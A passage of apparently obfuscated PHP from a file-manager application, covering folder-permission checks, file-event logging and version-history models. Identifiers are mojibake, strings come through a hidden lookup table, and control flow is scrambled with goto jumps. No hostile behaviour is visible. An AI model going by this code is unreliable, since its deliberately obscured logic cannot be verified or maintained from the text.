$E§˜Ë÷Áğë = array(); if (!$a¯°è„¸) { return $E§˜Ë÷Áğë; } foreach ($a¯°è„¸ as $cˆàÀ¨ñ¼Ø) { $eĞ±´öŠ¬ˆ = $this->authInfo($cˆàÀ¨ñ¼Ø); if (AuthModel::authCheckRoot($eĞ±´öŠ¬ˆ[$D†‚Û‡Š½‘[376]])) { $E§˜Ë÷Áğë[] = $cˆàÀ¨ñ¼Ø[$D†‚Û‡Š½‘[1445]]; } } return $E§˜Ë÷Áğë; } private function authFolderOwnerUser($d˜éñ‹ç³) { $aäŒ¯¿ºšÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F‘·Ø¨ìóĞ = array(); $D§¨İæå‘ã = !1; foreach ($d˜éñ‹ç³ as $EÀ¼‰ èÎ) { $Dæé­ñ´‚’ = $this->authInfo($EÀ¼‰ èÎ); if ($EÀ¼‰ èÎ[$aäŒ¯¿ºšÚ[456]] == $aäŒ¯¿ºšÚ[468]) { $D§¨İæå‘ã = !0; } if ($EÀ¼‰ èÎ[$aäŒ¯¿ºšÚ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Dæé­ñ´‚’[$aäŒ¯¿ºšÚ[376]])) { $F‘·Ø¨ìóĞ[] = $EÀ¼‰ èÎ[$aäŒ¯¿ºšÚ[456]]; } } } return array($aäŒ¯¿ºšÚ[535] => $F‘·Ø¨ìóĞ, $aäŒ¯¿ºšÚ[2283] => $D§¨İæå‘ã); } public function authMake($FÑŒéª‚) { goto E‡íŒÉÌ«£; Få÷¶ ¡ğ: $AĞÏ¯ëŞ½¼ = 0; $Eí†ğ¥õî‰ = array($e¥½îØœ§÷[369] => 0); foreach ($FÑŒéª‚ as $Eí†ğ¥õî‰) { $CĞ–Ì‹£ ‹ = $this->authInfo($Eí†ğ¥õî‰); $F‘ê£çëœÌ = $Eí†ğ¥õî‰[$e¥½îØœ§÷[456]]; $e‘¡‡³ù  = intval($CĞ–Ì‹£ ‹[$e¥½îØœ§÷[376]]); if ($Eí†ğ¥õî‰[$e¥½îØœ§÷[371]] == SourceModel::TYPE_USER && $F‘ê£çëœÌ == USER_ID) { $Fõ—¾ŸÅ•Â = !0; $CŞŠÎÊºÑ = $CĞ–Ì‹£ ‹; $E‹ñ¤È¦Ïš = $e‘¡‡³ù ; } else { if ($Eí†ğ¥õî‰[$e¥½îØœ§÷[371]] == SourceModel::TYPE_GROUP && in_array($F‘ê£çëœÌ, $dÀñ˜‚£™®)) { $A¢äù‰Ù©À = !0; if ($e‘¡‡³ù  >= $E©Ô“Ñ) { $E©Ô“Ñ = $e‘¡‡³ù ; $fæÈÇøØŠ = $CĞ–Ì‹£ ‹; } } else { if ($F‘ê£çëœÌ == $e¥½îØœ§÷[468]) { $AĞÏ¯ëŞ½¼ = !0; $a¶óÊò‹áæ = $CĞ–Ì‹£ ‹; $aµâ¤ ÷ = $e‘¡‡³ù ; } } } } goto dÅƒéæ¿Ü; BÈä£èŞ«: $aµâ¤ ÷ = 0; $CŞŠÎÊºÑ = 0; $fæÈÇøØŠ = 0; goto C“ÃöíÌ‡; E‡íŒÉÌ«£: $e¥½îØœ§÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$FÑŒéª‚) { return array($e¥½îØœ§÷[377] => 0, $e¥½îØœ§÷[418] => !1); } $EÕ…š¡°‰Ë = Session::get($e¥½îØœ§÷[2228]); goto dÒˆ¡¥Ñ†; C“ÃöíÌ‡: $a¶óÊò‹áæ = 0; $Fõ—¾ŸÅ•Â = 0; $A¢äù‰Ù©À = 0; goto Få÷¶ ¡ğ; dÒˆ¡¥Ñ†: $dÀñ˜‚£™® = array_to_keyvalue($EÕ…š¡°‰Ë, $e¥½îØœ§÷[33], $e¥½îØœ§÷[2113]); $E‹ñ¤È¦Ïš = 0; $E©Ô“Ñ = 0; goto BÈä£èŞ«; F©–ÌŒùÄ„: $FÚµš‹…âÑ = array($e¥½îØœ§÷[2276] => intval($c¼–¿’Ş¿), $e¥½îØœ§÷[2277] => $CĞ–Ì‹£ ‹, $e¥½îØœ§÷[2271] => array($e¥½îØœ§÷[388] => $FÓëš“–ğ‹, $e¥½îØœ§÷[75] => $Eí†ğ¥õî‰[$e¥½îØœ§÷[369]])); return $FÚµš‹…âÑ; goto cÕ“·”¨³; dÅƒéæ¿Ü: $c¼–¿’Ş¿ = $Fõ—¾ŸÅ•Â ? $E‹ñ¤È¦Ïš : ($A¢äù‰Ù©À ? $E©Ô“Ñ : $aµâ¤ ÷); $CĞ–Ì‹£ ‹ = $Fõ—¾ŸÅ•Â ? $CŞŠÎÊºÑ : ($A¢äù‰Ù©À ? $fæÈÇøØŠ : $a¶óÊò‹áæ); $FÓëš“–ğ‹ = $Fõ—¾ŸÅ•Â ? $e¥½îØœ§÷[2285] : ($A¢äù‰Ù©À ? $e¥½îØœ§÷[2286] : ($AĞÏ¯ëŞ½¼ ? $e¥½îØœ§÷[2287] : $e¥½îØœ§÷[361])); goto F©–ÌŒùÄ„; cÕ“·”¨³: } public function authTargetInfoMake($fòƒº÷Îß) { goto fîªéÒ…·Œ; fîªéÒ…·Œ: $dà“ÔÖ—¶ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‘äá‹¦ä = array(); $Aíìƒè–‹ = array(); goto E•äèØÓ®; B¹øÑˆóÄ: return array($dà“ÔÖ—¶ˆ[2288] => $C‘äá‹¦ä, $dà“ÔÖ—¶ˆ[2280] => $Aíìƒè–‹); goto cÏ¸Ã¯‡¢Í; E•äèØÓ®: foreach ($fòƒº÷Îß as $BŠÄ„³Ù¥Å) { if ($BŠÄ„³Ù¥Å[$dà“ÔÖ—¶ˆ[371]] == SourceModel::TYPE_USER) { $C‘äá‹¦ä[] = intval($BŠÄ„³Ù¥Å[$dà“ÔÖ—¶ˆ[456]]); } else { if ($BŠÄ„³Ù¥Å[$dà“ÔÖ—¶ˆ[371]] == SourceModel::TYPE_GROUP) { $Aíìƒè–‹[] = intval($BŠÄ„³Ù¥Å[$dà“ÔÖ—¶ˆ[456]]); } } } if ($C‘äá‹¦ä) { $C‘äá‹¦ä = Model($dà“ÔÖ—¶ˆ[474])->userListInfo($C‘äá‹¦ä); } if ($Aíìƒè–‹) { $c•‡Ö‘à› = array($dà“ÔÖ—¶ˆ[2187] => array($dà“ÔÖ—¶ˆ[384], $Aíìƒè–‹)); $Aíìƒè–‹ = Model($dà“ÔÖ—¶ˆ[458])->field($dà“ÔÖ—¶ˆ[2200])->where($c•‡Ö‘à›)->select(); $Aíìƒè–‹ = array_to_keyvalue($Aíìƒè–‹, $dà“ÔÖ—¶ˆ[2113]); } goto B¹øÑˆóÄ; cÏ¸Ã¯‡¢Í: } private function authInfo($Eš¡íÜó¶•) { $eï‹³µé„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($Eš¡íÜó¶•[$eï‹³µé„[2244]]) { $C¿‡‚ò¸Û = Model($eï‹³µé„[2263])->listData($Eš¡íÜó¶•[$eï‹³µé„[2244]]); if (!$C¿‡‚ò¸Û) { return !1; $e¢Ò¾´£çí = Model($eï‹³µé„[2263])->listData(); $a‰Ç¸³¾‚» = array_filter_by_field($e¢Ò¾´£çí, $eï‹³µé„[376], $eï‹³µé„[468]); return $a‰Ç¸³¾‚»; } $Dè«Ñ£®­ = array_field_key($C¿‡‚ò¸Û, array($eï‹³µé„[367], $eï‹³µé„[28], $eï‹³µé„[376], $eï‹³µé„[2131], $eï‹³µé„[2134])); $Dè«Ñ£®­[$eï‹³µé„[2289]] = $Eš¡íÜó¶•; return $Dè«Ñ£®­; } else { return array($eï‹³µé„[385] => 0, $eï‹³µé„[2119] => $Eš¡íÜó¶•[$eï‹³µé„[2245]], $eï‹³µé„[386] => $eï‹³µé„[33], $eï‹³µé„[2131] => $eï‹³µé„[2290]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\x63\145\x5f\145\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\155\x65", "\164\151\155\145", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\x69\157\x6e"), array("\x64\x65\163\143", '', "\x69\x6e\163\x65\162\x74\x2c\165\160\x64\141\164\145\54\163\145\x6c\145\x63\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e¦ÛÎÃÛ, $EÜƒÃÏƒˆƒ, $EîöŠ•³¢í = '') { goto FÏ…õ’ù¬Œ; eŠ‡˜Œ†®: $c½ÂïŞâ¾Í = array($Aó†¼Œ§Òˆ[383] => $e¦ÛÎÃÛ, $Aó†¼Œ§Òˆ[2291] => $B›Ìˆ‰Í[$Aó†¼Œ§Òˆ[461]], $Aó†¼Œ§Òˆ[2292] => $B›Ìˆ‰Í[$Aó†¼Œ§Òˆ[28]], $Aó†¼Œ§Òˆ[466] => $B›Ìˆ‰Í[$Aó†¼Œ§Òˆ[466]], $Aó†¼Œ§Òˆ[1436] => USER_ID, $Aó†¼Œ§Òˆ[388] => $EÜƒÃÏƒˆƒ, $Aó†¼Œ§Òˆ[1438] => $EîöŠ•³¢í); $this->addSystemLog($EÜƒÃÏƒˆƒ, $c½ÂïŞâ¾Í); return $this->add($c½ÂïŞâ¾Í); goto e»‘ùšìä²; Eí «íĞù: if (!$B›Ìˆ‰Í) { return !1; } if ($this->isCacheEvent($B›Ìˆ‰Í, $EÜƒÃÏƒˆƒ)) { return; } if ($EîöŠ•³¢í && is_string($EîöŠ•³¢í)) { $EîöŠ•³¢í = array($Aó†¼Œ§Òˆ[2143] => $EîöŠ•³¢í); } goto eŠ‡˜Œ†®; FÏ…õ’ù¬Œ: $Aó†¼Œ§Òˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->eventSave) { return; } $B›Ìˆ‰Í = Model($Aó†¼Œ§Òˆ[1121])->sourceInfo($e¦ÛÎÃÛ); goto Eí «íĞù; e»‘ùšìä²: } private function addSystemLog($Bİ“É†„Ç†, $cÑìŸö˜ù‹) { $F¯‹‰Çœµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($Bİ“É†„Ç† == $F¯‹‰Çœµ[2293]) { $Bİ“É†„Ç† = $cÑìŸö˜ù‹[$F¯‹‰Çœµ[405]][$F¯‹‰Çœµ[2294]]; } else { if (in_array($Bİ“É†„Ç†, array($F¯‹‰Çœµ[2090], $F¯‹‰Çœµ[2295]))) { $Bİ“É†„Ç† = $cÑìŸö˜ù‹[$F¯‹‰Çœµ[405]][$F¯‹‰Çœµ[695]]; } } $E¢À£˜Â = array_merge($cÑìŸö˜ù‹, array($F¯‹‰Çœµ[2296] => $cÑìŸö˜ù‹[$F¯‹‰Çœµ[369]], $F¯‹‰Çœµ[2297] => $cÑìŸö˜ù‹[$F¯‹‰Çœµ[2297]])); Model($F¯‹‰Çœµ[2053])->addLog($F¯‹‰Çœµ[2298] . $Bİ“É†„Ç†, $E¢À£˜Â); } private function isCacheEvent($Cƒ«³ó÷öˆ, $aˆÁ³ªàÁå) { if ($Cƒ«³ó÷öˆ[$_SERVER[³‘’¼äÑ™ÔÍ][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($bˆñÙ÷¸Í, $A¯¿¹…ÌÏö) { $dèÈİ¶åÓ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b£ì—‡š‘³ = Model($dèÈİ¶åÓ[1121])->sourceInfo($bˆñÙ÷¸Í); $fÄäáœÎ÷Ù = array($dèÈİ¶åÓ[2294] => $A¯¿¹…ÌÏö, $dèÈİ¶åÓ[28] => $b£ì—‡š‘³[$dèÈİ¶åÓ[28]]); return $this->addEvent($bˆñÙ÷¸Í, $dèÈİ¶åÓ[2293], $fÄäáœÎ÷Ù); } public function eventFileEdit($Cá¾‚ô“·) { $DÄ­Ãƒ…¯æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bñ–¥Í é = array($DÄ­Ãƒ…¯æ[2299] => $_SERVER[$DÄ­Ãƒ…¯æ[2300]], $DÄ­Ãƒ…¯æ[1759] => strtolower(ACTION)); return $this->addEvent($Cá¾‚ô“·, $DÄ­Ãƒ…¯æ[2080], $bñ–¥Í é); } public function eventRecycle($B¦³ä· ÷, $Aƒ— ­á¦) { return $this->addEvent($B¦³ä· ÷, $_SERVER[³‘’¼äÑ™ÔÍ][2295], $Aƒ— ­á¦); } public function eventRemove($A”Û³…Éƒ…) { $EÉéò¼ß½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c¯ÆêœÃÑ‹ = Model($EÉéò¼ß½[1121])->sourceInfo($A”Û³…Éƒ…); $dß¡Ğ®öò¦ = $c¯ÆêœÃÑ‹[$EÉéò¼ß½[28]]; return $this->addEvent($c¯ÆêœÃÑ‹[$EÉéò¼ß½[461]], $EÉéò¼ß½[2079], $dß¡Ğ®öò¦); } public function eventShare($F„ÉÔŠõÍÛ, $bÍ§Ô§Š³‡) { return $this->addEvent($F„ÉÔŠõÍÛ, $_SERVER[³‘’¼äÑ™ÔÍ][2090], $bÍ§Ô§Š³‡); } public function eventMove($d‚åçÄ‹à, $Fõ´«¼ßå‡, $a±•ÏËñ) { goto D­±´ß¬ œ; aœ„³×Œè: $C¡ìòâ‹ê = $A¾¦½„«á->sourceInfo($Fõ´«¼ßå‡); $E§ËÓÇÄ†Å = $A¾¦½„«á->sourceInfo($a±•ÏËñ); $F”ÄÓåÍ = array($bÃÛÙ—ä¥ò[1011] => $Fõ´«¼ßå‡, $bÃÛÙ—ä¥ò[2301] => $C¡ìòâ‹ê[$bÃÛÙ—ä¥ò[28]], $bÃÛÙ—ä¥ò[2302] => $C¡ìòâ‹ê[$bÃÛÙ—ä¥ò[466]], $bÃÛÙ—ä¥ò[1012] => $a±•ÏËñ, $bÃÛÙ—ä¥ò[2303] => $E§ËÓÇÄ†Å[$bÃÛÙ—ä¥ò[28]], $bÃÛÙ—ä¥ò[2304] => $E§ËÓÇÄ†Å[$bÃÛÙ—ä¥ò[466]]); goto B¹§Ç”¼Ö·; c·”ÄÙƒÇ„: $this->addEvent($Fõ´«¼ßå‡, $bÃÛÙ—ä¥ò[2305], $F”ÄÓåÍ); goto CÌ²¡É¶¤–; B¹§Ç”¼Ö·: $this->addEvent($d‚åçÄ‹à, $bÃÛÙ—ä¥ò[492], $F”ÄÓåÍ); $AÌˆŞë¡å = $A¾¦½„«á->sourceInfo($d‚åçÄ‹à); $F”ÄÓåÍ = array($bÃÛÙ—ä¥ò[369] => $AÌˆŞë¡å[$bÃÛÙ—ä¥ò[369]], $bÃÛÙ—ä¥ò[28] => $AÌˆŞë¡å[$bÃÛÙ—ä¥ò[28]]); goto c·”ÄÙƒÇ„; D­±´ß¬ œ: $bÃÛÙ—ä¥ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¾¦½„«á = Model($bÃÛÙ—ä¥ò[1121]); $AÌˆŞë¡å = $A¾¦½„«á->sourceInfo($d‚åçÄ‹à); goto aœ„³×Œè; CÌ²¡É¶¤–: } public function eventCopy($aç’“øÔé) { $this->eventCreate($aç’“øÔé, $_SERVER[³‘’¼äÑ™ÔÍ][490]); } public function eventRename($a­µ†•“, $CëŠ„Œí”, $aÌ˜£¥É…) { $fâ¾ñ‚•‡¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E°ˆğ½“œ = array($fâ¾ñ‚•‡¹[1011] => $CëŠ„Œí”, $fâ¾ñ‚•‡¹[1012] => $aÌ˜£¥É…); return $this->addEvent($a­µ†•“, $fâ¾ñ‚•‡¹[1136], $E°ˆğ½“œ); } public function eventAddComment($D²¥ÁôŒõæ, $cñ­–¦æÀ‰) { return $this->addEvent($D²¥ÁôŒõæ, $_SERVER[³‘’¼äÑ™ÔÍ][2306], $cñ­–¦æÀ‰); } public function eventAddDesc($C˜ï¨ê–Ë», $Bëˆ°’»ğ°) { return $this->addEvent($C˜ï¨ê–Ë», $_SERVER[³‘’¼äÑ™ÔÍ][2307], $Bëˆ°’»ğ°); } public function listBySource($fõ·÷®£Ë¦) { goto fŠ í¤Ç¤°; Eˆ©‰³øã†: return $this->eventListParse($EÍ¥‹ë¿ˆå, $fõ·÷®£Ë¦); goto B·Ä†­´ÉÙ; E¢‹Ïà¼Úñ: if ($f´œó‡Í˜†[$DÁÃçÒø—·[370]] == $DÁÃçÒø—·[83]) { $e‡®ÎÎ‘¦¾ = Model($DÁÃçÒø—·[1121])->listSearchChildren($fõ·÷®£Ë¦, 20000); $e‡®ÎÎ‘¦¾[] = $fõ·÷®£Ë¦ . $DÁÃçÒø—·[361]; $dÄ’Í°¼÷ = array($DÁÃçÒø—·[369] => array($DÁÃçÒø—·[7], $e‡®ÎÎ‘¦¾)); } $EÍ¥‹ë¿ˆå = $this->where($dÄ’Í°¼÷)->order($DÁÃçÒø—·[2308])->selectPage(); if ($EÍ¥‹ë¿ˆå[$DÁÃçÒø—·[351]][$DÁÃçÒø—·[352]] == 0) { $EÍ¥‹ë¿ˆå[$DÁÃçÒø—·[351]][$DÁÃçÒø—·[352]] = 1; $EÍ¥‹ë¿ˆå[$DÁÃçÒø—·[354]] = array(array($DÁÃçÒø—·[383] => $fõ·÷®£Ë¦, $DÁÃçÒø—·[2291] => $f´œó‡Í˜†[$DÁÃçÒø—·[461]], $DÁÃçÒø—·[1436] => $f´œó‡Í˜†[$DÁÃçÒø—·[378]], $DÁÃçÒø—·[388] => $DÁÃçÒø—·[2309], $DÁÃçÒø—·[389] => $f´œó‡Í˜†[$DÁÃçÒø—·[187]], $DÁÃçÒø—·[1438] => $DÁÃçÒø—·[33])); } goto Eˆ©‰³øã†; fŠ í¤Ç¤°: $DÁÃçÒø—· =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f´œó‡Í˜† = Model($DÁÃçÒø—·[1121])->sourceInfo($fõ·÷®£Ë¦); $dÄ’Í°¼÷ = array($DÁÃçÒø—·[383] => $fõ·÷®£Ë¦); goto E¢‹Ïà¼Úñ; B·Ä†­´ÉÙ: } private function eventListParse($fî™íË¶ôğ, $b‹ŸÜÔî£é) { goto b±…‹¶„ˆ´; B›ç÷¾§Ğ: $FÌ‰ŸÜÅ§° = Model($EÈ¢Œ’Œ®½[756])->sourceListInfo($D¼Ğ—êñò, !0); foreach ($Eæ²éğŸ»÷ as &$bµ±³Ö‚¨š) { if ($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[29]] == $EÈ¢Œ’Œ®½[492] && isset($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[1011]])) { $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[1011]] = $FÌ‰ŸÜÅ§°[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[1011]]]; $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[1012]] = $FÌ‰ŸÜÅ§°[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[1012]]]; } if ($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[29]] == $EÈ¢Œ’Œ®½[2305] && isset($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[369]])) { $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[369]] = $FÌ‰ŸÜÅ§°[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]][$EÈ¢Œ’Œ®½[369]]]; } $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[391]] = $FÌ‰ŸÜÅ§°[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[369]]]; $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2310]] = $FÌ‰ŸÜÅ§°[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2297]]]; if ($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[29]] == $EÈ¢Œ’Œ®½[2079]) { $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2310]] = $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[391]]; $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2297]] = $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2310]][$EÈ¢Œ’Œ®½[369]]; $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[391]] = !1; $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[369]] = $EÈ¢Œ’Œ®½[33]; } $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[2253]] = $F‘Û‰ÚÁãÊ[$bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[1445]]]; } $fî™íË¶ôğ[$EÈ¢Œ’Œ®½[354]] = $Eæ²éğŸ»÷; goto fÆĞêÚ°Æ; d¥ÎôÛ¼çª: $aÏù•áÃÛ¢ = array_to_keyvalue($Eæ²éğŸ»÷, $EÈ¢Œ’Œ®½[33], $EÈ¢Œ’Œ®½[2297]); foreach ($Eæ²éğŸ»÷ as $bµ±³Ö‚¨š) { $cÖÑ½’áÈ‘ = $bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[405]]; if ($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[29]] == $EÈ¢Œ’Œ®½[492] && isset($cÖÑ½’áÈ‘[$EÈ¢Œ’Œ®½[1011]])) { $D¼Ğ—êñò[] = $cÖÑ½’áÈ‘[$EÈ¢Œ’Œ®½[1011]] . $EÈ¢Œ’Œ®½[33]; $D¼Ğ—êñò[] = $cÖÑ½’áÈ‘[$EÈ¢Œ’Œ®½[1012]] . $EÈ¢Œ’Œ®½[33]; } if ($bµ±³Ö‚¨š[$EÈ¢Œ’Œ®½[29]] == $EÈ¢Œ’Œ®½[2305] && isset($cÖÑ½’áÈ‘[$EÈ¢Œ’Œ®½[369]])) { $D¼Ğ—êñò[] = $cÖÑ½’áÈ‘[$EÈ¢Œ’Œ®½[369]] . $EÈ¢Œ’Œ®½[33]; } } $D¼Ğ—êñò = array_merge($D¼Ğ—êñò, $aÏù•áÃÛ¢, array($b‹ŸÜÔî£é . $EÈ¢Œ’Œ®½[33])); goto BÛ›“Ø‹±õ; fÆĞêÚ°Æ: return $fî™íË¶ôğ; goto E•¼Ûˆå¥; b±…‹¶„ˆ´: $EÈ¢Œ’Œ®½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Eæ²éğŸ»÷ = $fî™íË¶ôğ[$EÈ¢Œ’Œ®½[354]]; $D¼Ğ—êñò = array_to_keyvalue($Eæ²éğŸ»÷, $EÈ¢Œ’Œ®½[33], $EÈ¢Œ’Œ®½[369]); goto d¥ÎôÛ¼çª; BÛ›“Ø‹±õ: $D¼Ğ—êñò = array_unique($D¼Ğ—êñò); $DŠºì†·³ƒ = array_unique(array_to_keyvalue($Eæ²éğŸ»÷, $EÈ¢Œ’Œ®½[33], $EÈ¢Œ’Œ®½[1445])); $F‘Û‰ÚÁãÊ = Model($EÈ¢Œ’Œ®½[477])->userListInfo($DŠºì†·³ƒ); goto B›ç÷¾§Ğ; E•¼Ûˆå¥: } public function removeBySource($a‰Âø¨•ïé) { $a‡¯ê¸ä°¹ = array($_SERVER[³‘’¼äÑ™ÔÍ][383] => $a‰Âø¨•ïé); $this->where($a‡¯ê¸ä°¹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\143\145\x5f\x68\x69\163\164\x6f\162\x79"; public function addHistory($C½°¤Ù„»Õ, $cë“©ùÏº¾ = '') { $f‰†ÖµŠœì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fŸííâ‘“ = array($f‰†ÖµŠœì[383] => $C½°¤Ù„»Õ[$f‰†ÖµŠœì[369]], $f‰†ÖµŠœì[1436] => isset($C½°¤Ù„»Õ[$f‰†ÖµŠœì[379]]) ? $C½°¤Ù„»Õ[$f‰†ÖµŠœì[379]] : $C½°¤Ù„»Õ[$f‰†ÖµŠœì[378]], $f‰†ÖµŠœì[420] => $C½°¤Ù„»Õ[$f‰†ÖµŠœì[419]], $f‰†ÖµŠœì[520] => $C½°¤Ù„»Õ[$f‰†ÖµŠœì[77]], $f‰†ÖµŠœì[2311] => $cë“©ùÏº¾); $aÜµ…ÂÕñ = $GLOBALS[$f‰†ÖµŠœì[6]][$f‰†ÖµŠœì[84]][$f‰†ÖµŠœì[2312]]; if ($aÜµ…ÂÕñ > 1) { $this->historyAutoClear($fŸííâ‘“[$f‰†ÖµŠœì[369]]); $this->add($fŸííâ‘“); } Model($f‰†ÖµŠœì[2313])->eventFileEdit($C½°¤Ù„»Õ[$f‰†ÖµŠœì[369]]); } private function historyAutoClear($c¬ƒó¦ “÷) { goto e‹ÂÉâÁŠ±; BğÉ“áÊŸ™: $C«®°‘¾‰ = array_to_keyvalue($cîÜÉ­÷ç«, $bÑ˜ˆ‚ùÌ•[33], $bÑ˜ˆ‚ùÌ•[419]); $C«®°‘¾‰ = array_slice($C«®°‘¾‰, $bÜ±®¥ÑŠ†); if (!$C¦”Ó’˜ || !$C«®°‘¾‰) { return; } goto B¯êõôˆĞ; B¯êõôˆĞ: $EÙÒå·±•‚ = array($bÑ˜ˆ‚ùÌ•[385] => array($bÑ˜ˆ‚ùÌ•[7], $C¦”Ó’˜)); $this->where($EÙÒå·±•‚)->delete(); Model($bÑ˜ˆ‚ùÌ•[422])->remove($C«®°‘¾‰); goto bÚóÂ†—Óä; e‹ÂÉâÁŠ±: $bÑ˜ˆ‚ùÌ• =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e·Ø­¸Ã’â = Model($bÑ˜ˆ‚ùÌ•[1092])->get($bÑ˜ˆ‚ùÌ•[2314]); $F…©äŠ‹å = $GLOBALS[$bÑ˜ˆ‚ùÌ•[6]][$bÑ˜ˆ‚ùÌ•[84]][$bÑ˜ˆ‚ùÌ•[2312]]; goto FŒİª¥àŠ§; E¼Œ„Âª™: if (!$cîÜÉ­÷ç« || $bÜ±®¥ÑŠ† >= count($cîÜÉ­÷ç«)) { return; } $C¦”Ó’˜ = array_to_keyvalue($cîÜÉ­÷ç«, $bÑ˜ˆ‚ùÌ•[33], $bÑ˜ˆ‚ùÌ•[367]); $C¦”Ó’˜ = array_slice($C¦”Ó’˜, $bÜ±®¥ÑŠ†); goto BğÉ“áÊŸ™; FŒİª¥àŠ§: $F¿ó•Øï™Í = $e·Ø­¸Ã’â == $bÑ˜ˆ‚ùÌ•[2315] ? 3 : $F…©äŠ‹å; if ($F…©äŠ‹å <= 1) { $F¿ó•Øï™Í = 1; } $bÜ±®¥ÑŠ† = $F¿ó•Øï™Í - 1; goto Bˆµµ¢ğ; Bˆµµ¢ğ: if ($bÜ±®¥ÑŠ† >= 500) { return; } $EÙÒå·±•‚ = array($bÑ˜ˆ‚ùÌ•[383] => $c¬ƒó¦ “÷); $cîÜÉ­÷ç« = $this->field($bÑ˜ˆ‚ùÌ•[2316])->where($EÙÒå·±•‚)->order($bÑ˜ˆ‚ùÌ•[2308])->select(); goto E¼Œ„Âª™; bÚóÂ†—Óä: } public function listData($Fš²Á­”) { goto A²Ø¿õŠ›¸; A²Ø¿õŠ›¸: $Eİ¢°ˆõÜù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÚ‡Åº‰èæ = array($Eİ¢°ˆõÜù[383] => $Fš²Á­”); $fšÒ—³‡§‡ = $Eİ¢°ˆõÜù[2317]; goto AíÇ‘ÊÙê¹; DŞ‡©½ãàĞ: $Eî´Í‹¬¼ = 3; if ($dƒÌ£Ä¨²À == $Eİ¢°ˆõÜù[2315]) { $Fº‡ŞğŸ„[$Eİ¢°ˆõÜù[354]] = array_slice($Fº‡ŞğŸ„[$Eİ¢°ˆõÜù[354]], 0, $Eî´Í‹¬¼); $Fº‡ŞğŸ„[$Eİ¢°ˆõÜù[351]] = array($Eİ¢°ˆõÜù[2318] => 1, $Eİ¢°ˆõÜù[2319] => 20, $Eİ¢°ˆõÜù[2320] => 1, $Eİ¢°ˆõÜù[2321] => count($Fº‡ŞğŸ„[$Eİ¢°ˆõÜù[354]])); } return $Fº‡ŞğŸ„; goto Dáº¥æ’·ô; AíÇ‘ÊÙê¹: $Fº‡ŞğŸ„ = $this->field($fšÒ—³‡§‡)->where($BÚ‡Åº‰èæ)->order($Eİ¢°ˆõÜù[2308])->selectPage(); $this->_listAppendUser($Fº‡ŞğŸ„[$Eİ¢°ˆõÜù[354]]); $dƒÌ£Ä¨²À = Model($Eİ¢°ˆõÜù[1092])->get($Eİ¢°ˆõÜù[2314]); goto DŞ‡©½ãàĞ; Dáº¥æ’·ô: } protected function _listAppendUser(&$B–±òšŸÀµ) { $fö¶„ÛÉâ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÎÂ¢²­ï™ = array_to_keyvalue($B–±òšŸÀµ, $fö¶„ÛÉâ‹[33], $fö¶„ÛÉâ‹[1445]); $eÄ½Ö«ÏÚë = Model($fö¶„ÛÉâ‹[477])->userListInfo($AÎÂ¢²­ï™); foreach ($B–±òšŸÀµ as &$b¢³î¿î¢­) { $e„„á° = $b¢³î¿î¢­[$fö¶„ÛÉâ‹[1445]]; $b¢³î¿î¢­[$fö¶„ÛÉâ‹[378]] = $eÄ½Ö«ÏÚë[$e„„á°] ? $eÄ½Ö«ÏÚë[$e„„á°] : !1; } } public function fileInfo($FÆ‡¼ÏÉØî) { $BëÁ©™ï…³ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CàÔ§£­ƒ = $this->tablePrefix; $eğİõéçÓ = 